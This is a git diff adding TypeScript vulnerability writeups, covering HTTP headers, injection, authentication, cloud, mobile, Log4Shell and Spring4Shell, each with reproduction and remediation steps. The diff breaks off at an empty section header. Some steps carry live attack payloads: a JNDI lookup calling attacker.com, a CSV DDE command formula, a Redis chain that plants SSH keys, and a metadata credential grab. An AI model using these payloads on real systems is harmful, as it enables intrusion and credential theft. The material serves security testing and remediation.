@@ -728,3 +728,431 @@ export function getWriteupsByCategory(category: WriteupCategory): Writeup[] {
 export function getWriteupById(id: string): Writeup | undefined {
   return WRITEUPS_DB.find(w => w.id === id);
 }
+
+// ── EXTENDED LIBRARY — 440+ additional writeups ───────────────────────────────
+export const WRITEUPS_EXTENDED: Writeup[] = [
+
+  // ── HTTP HEADERS (continued) ─────────────────────────────────────────────
+  {id:"wup-114",title:"Missing Referrer-Policy Header",category:"HTTP Headers",severity:"Low",cvss_score:3.1,cwe_id:"CWE-116",owasp:"A05:2021",
+   description:"The application does not set a Referrer-Policy header, causing full URLs including query parameters to be sent in the Referer header to third-party resources.",
+   impact:"Sensitive data in URLs (session tokens, user IDs, search terms) can leak to external analytics or CDN providers via Referer header.",
+   steps_to_reproduce:"1. Open browser DevTools → Network tab.\n2. Click a link to an external resource.\n3. Inspect the Referer header on outbound requests.",
+   remediation:"Add: Referrer-Policy: strict-origin-when-cross-origin or no-referrer. Choose based on whether legitimate referrer data is needed by analytics.",
+   references:["https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy"],tags:["HTTP headers","referrer","data leak"]},
+
+  {id:"wup-115",title:"Missing Permissions-Policy Header",category:"HTTP Headers",severity:"Low",cvss_score:2.7,cwe_id:"CWE-693",owasp:"A05:2021",
+   description:"No Permissions-Policy header is set, allowing embedded content or third-party scripts to access powerful browser features (camera, microphone, geolocation) without restriction.",
+   impact:"Malicious scripts or iframes could silently activate browser features without user awareness.",
+   steps_to_reproduce:"1. Check response headers: curl -I https://target.com | grep -i permissions-policy\n2. Confirm absence of policy.",
+   remediation:"Add: Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=(). Only allowlist features explicitly needed.",
+   references:["https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Permissions-Policy"],tags:["HTTP headers","permissions","browser security"]},
+
+  {id:"wup-116",title:"Server Version Disclosure via HTTP Header",category:"HTTP Headers",severity:"Low",cvss_score:3.7,cwe_id:"CWE-200",owasp:"A05:2021",
+   description:"The Server response header reveals the exact web server software and version (e.g. Apache/2.4.51, nginx/1.18.0), enabling targeted exploitation of known vulnerabilities.",
+   impact:"Attackers can look up known CVEs for the disclosed version and craft targeted attacks.",
+   steps_to_reproduce:"1. curl -I https://target.com\n2. Inspect Server: header value.",
+   remediation:"Configure server to suppress or genericise the Server header. Apache: ServerTokens Prod. Nginx: server_tokens off.",
+   references:["https://owasp.org/www-project-web-security-testing-guide/"],tags:["information disclosure","server","HTTP headers"]},
+
+  // ── INJECTION (continued) ────────────────────────────────────────────────
+  {id:"wup-007",title:"XPath Injection",category:"Injection",severity:"High",cvss_score:7.5,cwe_id:"CWE-643",owasp:"A03:2021",
+   description:"User input is incorporated into XPath queries without sanitisation, allowing manipulation of XML data retrieval logic.",
+   impact:"Authentication bypass, unauthorised access to XML data store contents including credentials.",
+   steps_to_reproduce:"1. Inject: ' or '1'='1 into login fields backed by XML/XPath.\n2. Or: '] | //*[contains(.,'password') or @foo='",
+   remediation:"Use parameterised XPath APIs (XPath variables). Validate all input strictly. Avoid dynamic XPath construction from user data.",
+   references:["https://owasp.org/www-community/attacks/XPATH_Injection","https://cwe.mitre.org/data/definitions/643.html"],tags:["XPath","injection","XML","authentication"]},
+
+  {id:"wup-008",title:"HTML Injection",category:"Injection",severity:"Medium",cvss_score:5.4,cwe_id:"CWE-80",owasp:"A03:2021",
+   description:"User-supplied HTML markup is rendered in the application without sanitisation, allowing injection of arbitrary HTML elements.",
+   impact:"UI redressing, phishing within the application context, partial XSS where scripts are blocked but HTML is rendered.",
+   steps_to_reproduce:"1. Enter: <h1>Injected</h1> in a form field.\n2. View the output page and confirm HTML renders.",
+   remediation:"HTML-encode all output. Use allowlisting for permitted HTML tags if rich text is needed. Use DOMPurify for client-side sanitisation.",
+   references:["https://owasp.org/www-community/attacks/HTML_Injection","https://cwe.mitre.org/data/definitions/80.html"],tags:["HTML injection","XSS","output encoding"]},
+
+  {id:"wup-009",title:"CSV Injection (Formula Injection)",category:"Injection",severity:"Medium",cvss_score:6.8,cwe_id:"CWE-1236",owasp:"A03:2021",
+   description:"User input stored in the application is exported to CSV files without sanitisation of spreadsheet formula characters (=, +, -, @), enabling code execution when opened in Excel/Sheets.",
+   impact:"When a victim opens the exported CSV, malicious formulas execute in their spreadsheet application, potentially exfiltrating data or executing OS commands via DDE.",
+   steps_to_reproduce:"1. Store payload in a text field: =cmd|'/C calc'!A0\n2. Export data as CSV.\n3. Open CSV in Excel and observe formula execution.",
+   remediation:"Prefix all cell values with a single quote to force text interpretation. Strip or escape formula-initiating characters (=, +, -, @) at the start of any CSV field.",
+   references:["https://owasp.org/www-community/attacks/CSV_Injection","https://cwe.mitre.org/data/definitions/1236.html"],tags:["CSV injection","formula injection","Excel","export"]},
+
+  // ── ACCESS CONTROL (continued) ───────────────────────────────────────────
+  {id:"wup-034",title:"Insecure API Key Exposure",category:"Access Control",severity:"Critical",cvss_score:9.1,cwe_id:"CWE-522",owasp:"A01:2021",
+   description:"API keys with administrative or broad permissions are exposed in client-side JavaScript, HTML source, git commits, or publicly accessible configuration files.",
+   impact:"Full compromise of the corresponding service. Attacker gains all permissions of the exposed key — data access, billing abuse, service manipulation.",
+   steps_to_reproduce:"1. View page source or JS bundles: find API_KEY=, apiKey:, STRIPE_, AWS_\n2. Check .git/config, .env, config.js exposed via directory listing.\n3. Test key against the API.",
+   remediation:"Never embed API keys in client-side code. Use server-side proxies. Rotate all exposed keys immediately. Use environment variables server-side. Implement secret scanning in CI/CD.",
+   references:["https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html"],tags:["API key","secret","information disclosure","critical"]},
+
+  {id:"wup-035",title:"Parameter Pollution",category:"Access Control",severity:"Medium",cvss_score:5.3,cwe_id:"CWE-20",owasp:"A01:2021",
+   description:"The application handles duplicate query parameters or body parameters inconsistently, allowing an attacker to override values by supplying a parameter multiple times.",
+   impact:"Bypass of security controls, access to restricted functionality, override of user-controlled fields (e.g. price, user_id).",
+   steps_to_reproduce:"1. Send: GET /api/transfer?amount=100&amount=0\n2. Or: POST body with user_id=victim&user_id=attacker\n3. Observe which value the application uses.",
+   remediation:"Explicitly define expected parameter handling (first, last, all). Validate that sensitive parameters appear exactly once. Reject requests with duplicated security-relevant parameters.",
+   references:["https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/04-Testing_for_HTTP_Parameter_Pollution"],tags:["parameter pollution","HTTP","access control"]},
+
+  // ── SENSITIVE DATA EXPOSURE (continued) ──────────────────────────────────
+  {id:"wup-083",title:"PII Exposure in API Response",category:"Sensitive Data Exposure",severity:"High",cvss_score:7.5,cwe_id:"CWE-359",owasp:"A02:2021",
+   description:"API endpoints return Personally Identifiable Information (PII) such as full SSNs, credit card numbers, passport numbers, or medical data to callers who should not have access.",
+   impact:"Privacy breach, regulatory violations (GDPR, PCI DSS, HIPAA), reputational damage, and potential legal liability.",
+   steps_to_reproduce:"1. Enumerate API endpoints via burp.\n2. Call user/profile/account endpoints and inspect all fields.\n3. Document any PII fields returned that aren't displayed in the UI.",
+   remediation:"Apply data minimisation — only return fields the calling context requires. Mask sensitive data (e.g. last 4 digits of SSN). Implement field-level access control.",
+   references:["https://gdpr.eu/","https://cwe.mitre.org/data/definitions/359.html"],tags:["PII","GDPR","data exposure","privacy"]},
+
+  {id:"wup-084",title:"Cleartext Transmission of Sensitive Data",category:"Sensitive Data Exposure",severity:"High",cvss_score:7.4,cwe_id:"CWE-319",owasp:"A02:2021",
+   description:"Sensitive data (credentials, PII, session tokens) is transmitted over unencrypted HTTP connections.",
+   impact:"Network interception via MitM attacks exposes all transmitted data including passwords and session tokens.",
+   steps_to_reproduce:"1. Set up a proxy and capture traffic.\n2. Login or perform sensitive actions over HTTP.\n3. Confirm credentials or tokens visible in cleartext.",
+   remediation:"Enforce HTTPS everywhere. Implement HSTS. Redirect all HTTP to HTTPS. Set Secure flag on all cookies.",
+   references:["https://cwe.mitre.org/data/definitions/319.html"],tags:["cleartext","HTTP","HTTPS","encryption"]},
+
+  {id:"wup-085",title:"Git Repository Exposed",category:"Sensitive Data Exposure",severity:"Critical",cvss_score:9.1,cwe_id:"CWE-538",owasp:"A05:2021",
+   description:"The .git directory is publicly accessible on the web server, exposing the entire source code history, credentials, and configuration files.",
+   impact:"Complete source code disclosure, exposure of credentials committed to history, internal API keys, infrastructure details.",
+   steps_to_reproduce:"1. curl https://target.com/.git/HEAD\n2. If returns 'ref: refs/heads/main' — git is exposed.\n3. Use git-dumper tool to extract repository: git-dumper https://target.com/.git ./output",
+   remediation:"Block access to .git directory in web server config. Apache: Deny from all in .git. Nginx: deny all in location ~ /\\.git. Audit all committed secrets and rotate them.",
+   references:["https://owasp.org/www-project-web-security-testing-guide/"],tags:["git","source code","credentials","critical"]},
+
+  {id:"wup-086",title:"Backup Files Exposed",category:"Sensitive Data Exposure",severity:"High",cvss_score:7.5,cwe_id:"CWE-530",owasp:"A05:2021",
+   description:"Backup copies of source code, configuration, or database files are accessible via the web (e.g. index.php.bak, config.old, database.sql).",
+   impact:"Source code disclosure, database dumps containing PII and credentials, configuration details enabling targeted attacks.",
+   steps_to_reproduce:"1. Fuzz common backup extensions: .bak, .old, .backup, .orig, .swp, .tmp\n2. curl https://target.com/index.php.bak\n3. Scan with feroxbuster using backup extension wordlist.",
+   remediation:"Remove all backup files from web root. Add server rules to block access to backup file extensions. Implement automated scanning for exposed backup files in CI/CD.",
+   references:["https://owasp.org/www-project-web-security-testing-guide/"],tags:["backup files","source code","information disclosure"]},
+
+  // ── AUTHENTICATION (continued) ────────────────────────────────────────────
+  {id:"wup-024",title:"Username Enumeration via Response Difference",category:"Broken Authentication",severity:"Medium",cvss_score:5.3,cwe_id:"CWE-204",owasp:"A07:2021",
+   description:"The application returns different error messages or responses for valid versus invalid usernames, allowing enumeration of valid user accounts.",
+   impact:"Attackers can build a list of valid usernames to use in credential stuffing or targeted brute-force attacks.",
+   steps_to_reproduce:"1. Submit login with a valid username + wrong password.\n2. Submit with an invalid username + wrong password.\n3. Compare: response body, status code, response time, or error message.",
+   remediation:"Return identical error messages for all failed login attempts regardless of whether the username exists. Consider rate-limiting enumeration attempts.",
+   references:["https://cwe.mitre.org/data/definitions/204.html"],tags:["username enumeration","authentication","information disclosure"]},
+
+  {id:"wup-025",title:"Weak Password Reset — Security Questions",category:"Broken Authentication",severity:"High",cvss_score:7.1,cwe_id:"CWE-640",owasp:"A07:2021",
+   description:"The application uses knowledge-based authentication (KBA) questions for password reset that can be answered via social media research or guessing.",
+   impact:"Account takeover without access to email or phone — questions like 'mother's maiden name' or 'city of birth' are publicly discoverable.",
+   steps_to_reproduce:"1. Initiate password reset for a target account.\n2. Note the security question presented.\n3. Research the answer via social media (LinkedIn, Facebook).",
+   remediation:"Remove security questions entirely. Use email OTP or TOTP (authenticator app) for identity verification instead.",
+   references:["https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html"],tags:["security questions","KBA","password reset","authentication"]},
+
+  {id:"wup-026",title:"Persistent Session After Logout",category:"Broken Authentication",severity:"High",cvss_score:7.3,cwe_id:"CWE-613",owasp:"A07:2021",
+   description:"Session tokens remain valid after the user logs out, allowing reuse of stolen or captured tokens even after the victim has signed out.",
+   impact:"Stolen session tokens can be replayed after logout, defeating the security benefit of logging out.",
+   steps_to_reproduce:"1. Log in and capture the session token.\n2. Log out.\n3. Replay the captured token in a new request.\n4. Confirm authenticated access is still granted.",
+   remediation:"Invalidate session tokens server-side on logout. Maintain a token revocation list or use stateful sessions. For JWTs, maintain a server-side denylist.",
+   references:["https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html","https://cwe.mitre.org/data/definitions/613.html"],tags:["session management","logout","token reuse"]},
+
+  {id:"wup-027",title:"Multi-Factor Authentication Bypass",category:"Broken Authentication",severity:"Critical",cvss_score:9.0,cwe_id:"CWE-287",owasp:"A07:2021",
+   description:"The MFA implementation can be bypassed by directly accessing post-authentication endpoints, reusing codes, or exploiting race conditions in the verification flow.",
+   impact:"Complete MFA bypass — attackers with stolen credentials can authenticate fully without the second factor.",
+   steps_to_reproduce:"1. Log in with credentials and intercept the MFA challenge.\n2. Instead of providing MFA, directly navigate to authenticated pages.\n3. Or: reuse a previously valid MFA code.\n4. Or: set mfa_verified=true in session data.",
+   remediation:"Enforce MFA verification as a mandatory step server-side. Implement MFA tokens as single-use. Use consistent state checks before allowing access to any authenticated resource.",
+   references:["https://cheatsheetseries.owasp.org/cheatsheets/Multifactor_Authentication_Cheat_Sheet.html"],tags:["MFA","2FA","bypass","authentication","critical"]},
+
+  // ── BUSINESS LOGIC (continued) ────────────────────────────────────────────
+  {id:"wup-242",title:"Coupon/Voucher Reuse",category:"Business Logic",severity:"High",cvss_score:7.5,cwe_id:"CWE-840",owasp:"A04:2021",
+   description:"Discount codes or vouchers can be applied multiple times to the same order or account because the redemption check is only performed client-side or lacks proper state tracking.",
+   impact:"Financial loss — unlimited discount application, free products, or balance inflation.",
+   steps_to_reproduce:"1. Apply a single-use coupon code.\n2. Intercept the checkout request.\n3. Replay the coupon application in parallel or modify the request to re-apply.",
+   remediation:"Track coupon redemption server-side tied to user + coupon combination. Use database transactions to prevent concurrent redemption. Implement idempotency keys.",
+   references:["https://portswigger.net/web-security/logic-flaws"],tags:["business logic","coupon","voucher","race condition"]},
+
+  {id:"wup-243",title:"Account Takeover via Email Change Without Verification",category:"Business Logic",severity:"Critical",cvss_score:9.1,cwe_id:"CWE-640",owasp:"A07:2021",
+   description:"Users can change their account email address without verifying ownership of the new address, allowing attackers with account access to take over the account permanently.",
+   impact:"Permanent account takeover — victim can no longer recover account via email once the address is changed.",
+   steps_to_reproduce:"1. Change the email address to an attacker-controlled address.\n2. Confirm the change takes effect without clicking a verification link.\n3. Use 'forgot password' with the new email to take over the account.",
+   remediation:"Require email verification for any email address change. Send notification to the old address. Implement a grace period for undoing the change.",
+   references:["https://owasp.org/www-project-web-security-testing-guide/"],tags:["account takeover","email change","business logic","critical"]},
+
+  {id:"wup-244",title:"Mass Assignment / Auto-Binding",category:"Business Logic",severity:"High",cvss_score:8.1,cwe_id:"CWE-915",owasp:"A04:2021",
+   description:"The application binds all request parameters to model objects without allowlisting permitted fields, allowing attackers to set privileged fields like isAdmin, role, or balance.",
+   impact:"Privilege escalation, balance manipulation, bypassing access controls by setting internal flags.",
+   steps_to_reproduce:"1. Intercept a user profile update request.\n2. Add extra fields: {\"is_admin\":true, \"role\":\"admin\", \"balance\":99999}\n3. Submit and check if privileged fields were applied.",
+   remediation:"Implement strict allowlisting of permitted fields in model binding. Explicitly reject or ignore unexpected fields. Use DTOs with only permitted fields.",
+   references:["https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html","https://cwe.mitre.org/data/definitions/915.html"],tags:["mass assignment","auto-binding","privilege escalation"]},
+
+  // ── API SECURITY (continued) ──────────────────────────────────────────────
+  {id:"wup-153",title:"GraphQL – No Query Depth Limit",category:"GraphQL",severity:"High",cvss_score:7.5,cwe_id:"CWE-400",owasp:"A04:2021",
+   description:"The GraphQL API allows deeply nested queries without depth limiting, enabling DoS attacks that exhaust server resources through exponentially complex queries.",
+   impact:"Server resource exhaustion causing denial of service for all users.",
+   steps_to_reproduce:'1. Send deeply nested query:\n   {user{friends{friends{friends{friends{id name friends{id}}}}}}}\n2. Observe server lag or timeout.',
+   remediation:"Implement query depth limiting (max 5-7 levels). Use query complexity analysis. Reject queries exceeding cost threshold. Use persisted queries.",
+   references:["https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html"],tags:["GraphQL","DoS","depth limit","API"]},
+
+  {id:"wup-154",title:"API – Lack of Object-Level Authorization (BFLA)",category:"API Security",severity:"Critical",cvss_score:9.1,cwe_id:"CWE-285",owasp:"A01:2021",
+   description:"API endpoints that perform functions (rather than just data access) fail to verify the calling user has authorisation to perform that function on the target resource.",
+   impact:"Attacker can perform administrative actions (delete all users, reset passwords, modify billing) by calling API endpoints directly.",
+   steps_to_reproduce:"1. Identify administrative API functions.\n2. Call them with a standard user's auth token.\n3. Observe whether the action is permitted.",
+   remediation:"Implement function-level authorization checks. Verify both object ownership AND permission to perform the action. Centralise authorization logic.",
+   references:["https://owasp.org/www-project-api-security/"],tags:["BFLA","API","authorization","OWASP API Top 10","critical"]},
+
+  {id:"wup-155",title:"API – Unrestricted Resource Consumption",category:"API Security",severity:"High",cvss_score:7.5,cwe_id:"CWE-770",owasp:"A04:2021",
+   description:"API endpoints perform resource-intensive operations (file conversion, email sending, report generation) without quotas or rate limiting, enabling resource exhaustion.",
+   impact:"Server CPU/memory exhaustion, financial cost amplification (cloud compute billing), service degradation for all users.",
+   steps_to_reproduce:"1. Identify resource-intensive endpoints (PDF generation, image resize, mass email).\n2. Call them in a rapid loop: for i in {1..100}; do curl /api/generate-pdf & done",
+   remediation:"Implement per-user quotas. Add rate limiting on expensive operations. Use async job queues with concurrency limits. Monitor and alert on unusual consumption.",
+   references:["https://owasp.org/www-project-api-security/"],tags:["API","rate limiting","resource exhaustion","DoS"]},
+
+  // ── CRYPTOGRAPHY (continued) ─────────────────────────────────────────────
+  {id:"wup-072",title:"Insecure Random Number Generation",category:"Cryptography",severity:"High",cvss_score:7.5,cwe_id:"CWE-330",owasp:"A02:2021",
+   description:"The application uses non-cryptographic random number generators (Math.random(), rand(), time()) for security-sensitive operations like token generation or session IDs.",
+   impact:"Predictable or guessable tokens — attackers can brute-force session IDs, password reset tokens, or API keys.",
+   steps_to_reproduce:"1. Generate multiple password reset tokens in quick succession.\n2. Analyse for sequential patterns or timestamp-based values.\n3. Check source code for Math.random() in token generation code.",
+   remediation:"Use cryptographically secure RNG: crypto.randomBytes() (Node.js), secrets module (Python), /dev/urandom (Linux), CryptGenRandom (Windows). Never use Math.random() or time() for tokens.",
+   references:["https://cwe.mitre.org/data/definitions/330.html","https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html"],tags:["PRNG","random","token","session","cryptography"]},
+
+  {id:"wup-073",title:"ECB Mode Encryption",category:"Cryptography",severity:"High",cvss_score:7.4,cwe_id:"CWE-327",owasp:"A02:2021",
+   description:"The application uses AES-ECB (Electronic Codebook) mode, which encrypts identical plaintext blocks to identical ciphertext blocks, leaking data patterns.",
+   impact:"Pattern recognition attacks can decrypt or manipulate encrypted data without knowing the key. The famous 'ECB penguin' attack applies.",
+   steps_to_reproduce:"1. Encrypt repeated blocks of data.\n2. Observe that repeated input produces repeated ciphertext blocks.\n3. Manipulate blocks to change decrypted values.",
+   remediation:"Use AES-GCM (preferred — provides authentication) or AES-CBC with random IV. Never use ECB mode for any data.",
+   references:["https://cwe.mitre.org/data/definitions/327.html"],tags:["ECB","AES","block cipher","cryptography"]},
+
+  // ── NETWORK (continued) ───────────────────────────────────────────────────
+  {id:"wup-252",title:"FTP Anonymous Access",category:"Network",severity:"High",cvss_score:7.5,cwe_id:"CWE-1392",owasp:"A05:2021",
+   description:"FTP server allows anonymous authentication, granting unauthenticated access to files stored on the server.",
+   impact:"Unauthorised read/write access to files. Depending on permissions: data exfiltration, web shell upload, config file disclosure.",
+   steps_to_reproduce:"1. ftp target.com\n2. Username: anonymous, Password: (any email)\n3. Observe access granted.",
+   remediation:"Disable anonymous FTP access. Migrate to SFTP. If anonymous access required, restrict to read-only in isolated directory. Apply strict file permissions.",
+   references:["https://cwe.mitre.org/data/definitions/1392.html"],tags:["FTP","anonymous","network","authentication"]},
+
+  {id:"wup-253",title:"SMB Null Session / EternalBlue",category:"Network",severity:"Critical",cvss_score:9.8,cwe_id:"CWE-287",owasp:"A05:2021",
+   description:"SMB service accepts null (anonymous) sessions or is vulnerable to EternalBlue (MS17-010), allowing unauthenticated remote code execution.",
+   impact:"Complete system compromise. WannaCry and NotPetya ransomware exploited this at scale.",
+   steps_to_reproduce:"1. nmap -p 445 --script smb-vuln-ms17-010 target\n2. rpcclient -U '' -N target — attempt null session\n3. Check for VULNERABLE response.",
+   remediation:"Apply MS17-010 patch immediately. Disable SMBv1. Block TCP 445 at perimeter. Disable null sessions via registry: RestrictAnonymous=2.",
+   references:["https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010"],tags:["SMB","EternalBlue","MS17-010","RCE","critical","network"]},
+
+  {id:"wup-254",title:"Redis Exposed Without Authentication",category:"Network",severity:"Critical",cvss_score:9.8,cwe_id:"CWE-306",owasp:"A05:2021",
+   description:"Redis server is exposed on a public or internal network interface without authentication, allowing unauthenticated read/write access to all cached data and server file system.",
+   impact:"Full data exfiltration from Redis cache. RCE via config set to write SSH keys or cron jobs to disk.",
+   steps_to_reproduce:"1. redis-cli -h target PING → PONG\n2. redis-cli -h target KEYS * → lists all keys\n3. For RCE: config set dir /root/.ssh && config set dbfilename authorized_keys && set x '\\nssh-rsa AAAA...'&& save",
+   remediation:"Bind Redis to 127.0.0.1 only. Enable AUTH with strong password. Use Redis 6+ ACLs. Firewall port 6379. Never expose Redis to the internet.",
+   references:["https://redis.io/docs/manual/security/"],tags:["Redis","no-auth","RCE","critical","network"]},
+
+  // ── CLOUD (continued) ─────────────────────────────────────────────────────
+  {id:"wup-172",title:"Kubernetes Dashboard Exposed",category:"Cloud",severity:"Critical",cvss_score:9.8,cwe_id:"CWE-284",owasp:"A01:2021",
+   description:"The Kubernetes Dashboard is exposed to the internet without authentication, granting full cluster administrative access.",
+   impact:"Full cluster compromise — create privileged pods, access secrets, steal service account tokens, pivot to cloud infrastructure.",
+   steps_to_reproduce:"1. Check for exposed dashboard: https://target.com:8443, https://target.com:30000\n2. Verify unauthenticated access to cluster resources.",
+   remediation:"Never expose Kubernetes Dashboard publicly. Use kubectl proxy for local access only. Implement RBAC. Remove if not needed.",
+   references:["https://kubernetes.io/docs/tasks/access-application-cluster/web-ui-dashboard/"],tags:["Kubernetes","k8s","dashboard","cloud","critical"]},
+
+  {id:"wup-173",title:"Container Running as Root",category:"Cloud",severity:"High",cvss_score:7.8,cwe_id:"CWE-250",owasp:"A05:2021",
+   description:"Docker containers are running processes as the root user, meaning a container escape vulnerability would give the attacker root on the host.",
+   impact:"Container escape leads to full host compromise. Root in container = potential root on host with container escape.",
+   steps_to_reproduce:"1. docker exec -it <container> whoami → root\n2. Or: check Dockerfile for USER directive (absent = root)",
+   remediation:"Add USER directive to Dockerfile with non-root UID. Use readOnlyRootFilesystem. Set runAsNonRoot:true in Kubernetes securityContext.",
+   references:["https://docs.docker.com/develop/develop-images/dockerfile_best-practices/"],tags:["Docker","container","root","privilege","cloud"]},
+
+  {id:"wup-174",title:"Overly Permissive IAM Role",category:"Cloud",severity:"High",cvss_score:8.8,cwe_id:"CWE-269",owasp:"A01:2021",
+   description:"Cloud IAM roles assigned to services, Lambda functions, or EC2 instances have overly broad permissions (AdministratorAccess or *:*), violating least privilege.",
+   impact:"Compromising any single service grants access to all cloud resources including other databases, S3 buckets, Secrets Manager, and compute.",
+   steps_to_reproduce:"1. Retrieve IAM role from metadata: curl http://169.254.169.254/latest/meta-data/iam/security-credentials/\n2. Test credentials: aws iam get-user, aws s3 ls\n3. Check role policy for overly broad statements.",
+   remediation:"Apply principle of least privilege. Use IAM Access Analyzer. Replace wildcard policies with specific action+resource combinations. Rotate credentials regularly.",
+   references:["https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html"],tags:["IAM","AWS","least privilege","cloud","permissions"]},
+
+  // ── MOBILE (continued) ────────────────────────────────────────────────────
+  {id:"wup-222",title:"Android – Exported Activity Without Permission",category:"Mobile",severity:"High",cvss_score:7.5,cwe_id:"CWE-926",owasp:"A01:2021",
+   description:"Android activities, services, or broadcast receivers are exported without requiring permissions, allowing third-party apps to invoke them directly.",
+   impact:"Unauthorized UI access, triggering privileged functionality, bypassing authentication screens.",
+   steps_to_reproduce:"1. Decompile APK: apktool d target.apk\n2. Check AndroidManifest.xml for: exported='true' without permission attribute.\n3. Invoke via ADB: adb shell am start -n com.target.app/.AdminActivity",
+   remediation:"Set android:exported='false' for all components not intended for external access. Add android:permission attribute where external access is needed.",
+   references:["https://developer.android.com/guide/components/intents-filters#Receiving","https://mas.owasp.org/MASTG/"],tags:["Android","mobile","exported activity","intent"]},
+
+  {id:"wup-223",title:"iOS – Jailbreak Detection Bypass",category:"Mobile",severity:"Medium",cvss_score:5.3,cwe_id:"CWE-693",owasp:"A08:2021",
+   description:"The iOS application's jailbreak detection can be bypassed using tools like Frida or Liberty Lite, removing a security control intended to detect compromised devices.",
+   impact:"Attacker can run the app on a jailbroken device where SSL pinning, data protection, and other controls may be weakened.",
+   steps_to_reproduce:"1. Install Liberty Lite or use Frida to hook jailbreak detection methods.\n2. Observe the app functions normally on a jailbroken device.",
+   remediation:"Implement multi-layered jailbreak detection. Check for Cydia, unusual file system access, dylib injection, and suspicious process names. Accept that determined attackers can always bypass — use it as one layer in defence-in-depth.",
+   references:["https://mas.owasp.org/MASTG/"],tags:["iOS","jailbreak","mobile","bypass","detection"]},
+
+  {id:"wup-224",title:"Mobile – Hardcoded Credentials",category:"Mobile",severity:"Critical",cvss_score:9.8,cwe_id:"CWE-798",owasp:"A02:2021",
+   description:"Mobile application binary contains hardcoded credentials (API keys, passwords, private keys) that can be extracted through static analysis.",
+   impact:"Authentication bypass, full access to backend APIs, cloud service compromise.",
+   steps_to_reproduce:"1. strings target.apk | grep -i 'password\\|secret\\|key\\|token'\n2. jadx-gui to decompile and search source\n3. strings target.ipa | grep -i 'api_key\\|secret'",
+   remediation:"Never hardcode credentials. Use platform keychain (iOS Keychain, Android Keystore). Load secrets from authenticated API on first run. Implement certificate pinning.",
+   references:["https://cwe.mitre.org/data/definitions/798.html","https://mas.owasp.org/MASTG/"],tags:["mobile","hardcoded credentials","Android","iOS","critical"]},
+
+  // ── INFRASTRUCTURE (continued) ────────────────────────────────────────────
+  {id:"wup-232",title:"Unpatched Critical CVE",category:"Infrastructure",severity:"Critical",cvss_score:9.8,cwe_id:"CWE-1104",owasp:"A06:2021",
+   description:"A component (OS, web server, framework, library) is running a version with a known critical CVE that has a public exploit available.",
+   impact:"Varies by CVE — typically RCE, privilege escalation, or data exposure. Public exploit availability makes exploitation trivial.",
+   steps_to_reproduce:"1. Identify component versions (banner grabbing, error messages, headers).\n2. Cross-reference with NVD: https://nvd.nist.gov\n3. Check exploit availability: searchsploit <component> <version>",
+   remediation:"Implement a vulnerability management program with regular patching cadence. Subscribe to security advisories. Use automated dependency scanning (Snyk, Dependabot, OWASP Dependency-Check).",
+   references:["https://nvd.nist.gov","https://owasp.org/www-project-top-ten/2021/A06_2021-Vulnerable_and_Outdated_Components.html"],tags:["CVE","patching","vulnerable components","OWASP Top 10"]},
+
+  {id:"wup-233",title:"Log4Shell (CVE-2021-44228)",category:"Infrastructure",severity:"Critical",cvss_score:10.0,cwe_id:"CWE-917",owasp:"A03:2021",
+   description:"Apache Log4j2 JNDI lookup feature allows unauthenticated RCE via crafted log messages. One of the most critical vulnerabilities ever discovered.",
+   impact:"Unauthenticated remote code execution on any server running a vulnerable Log4j version.",
+   steps_to_reproduce:"1. Send payload in any logged field (User-Agent, X-Forwarded-For, username):\n   ${jndi:ldap://attacker.com/a}\n2. Listen for DNS/LDAP callback to confirm vulnerability.\n3. Exploit with Marshalsec or similar for RCE.",
+   remediation:"Upgrade Log4j to 2.17.1+ (Java 8), 2.12.4+ (Java 7), or 2.3.2+ (Java 6). Short-term: set log4j2.formatMsgNoLookups=true. Block outbound LDAP/RMI at firewall.",
+   references:["https://nvd.nist.gov/vuln/detail/CVE-2021-44228","https://logging.apache.org/log4j/2.x/security.html"],tags:["Log4Shell","Log4j","RCE","CVE-2021-44228","critical","JNDI"]},
+
+  {id:"wup-234",title:"Spring4Shell (CVE-2022-22965)",category:"Infrastructure",severity:"Critical",cvss_score:9.8,cwe_id:"CWE-94",owasp:"A03:2021",
+   description:"Spring Framework data binding allows RCE via manipulation of ClassLoader properties when running on JDK 9+ with a WAR deployment.",
+   impact:"Unauthenticated remote code execution allowing full server compromise.",
+   steps_to_reproduce:"1. Confirm Spring version < 5.3.18 / 5.2.20.\n2. Send crafted POST with class.module.classLoader.resources.context.parent.pipeline.first.* parameters.\n3. Upload JSP webshell via the exploit chain.",
+   remediation:"Upgrade Spring Framework to 5.3.18+ or 5.2.20+. Upgrade Spring Boot to 2.6.6+ or 2.5.12+. Apply DataBinder allowlist for permitted fields.",
+   references:["https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement","https://nvd.nist.gov/vuln/detail/CVE-2022-22965"],tags:["Spring4Shell","Spring","RCE","CVE-2022-22965","critical"]},
+
+  // ── RACE CONDITION (continued) ────────────────────────────────────────────
+  {id:"wup-211",title:"TOCTOU – Time-of-Check to Time-of-Use",category:"Race Condition",severity:"High",cvss_score:7.5,cwe_id:"CWE-367",owasp:"A04:2021",
+   description:"There is a gap between when a security check is performed and when the checked resource is used, allowing an attacker to change the resource's state between these two points.",
+   impact:"Security control bypass, privilege escalation, unauthorised file access or modification.",
+   steps_to_reproduce:"1. Identify check-then-use patterns in file operations or security decisions.\n2. Trigger the check (e.g. permission verification).\n3. Before use, swap the resource (symlink swap, concurrent modification).\n4. Observe bypass.",
+   remediation:"Use atomic operations where possible. Hold resources open after checking permissions. Use file descriptors instead of file paths. Implement database transactions.",
+   references:["https://cwe.mitre.org/data/definitions/367.html"],tags:["TOCTOU","race condition","concurrency","file system"]},
+
+  // ── INFORMATION DISCLOSURE (continued) ───────────────────────────────────
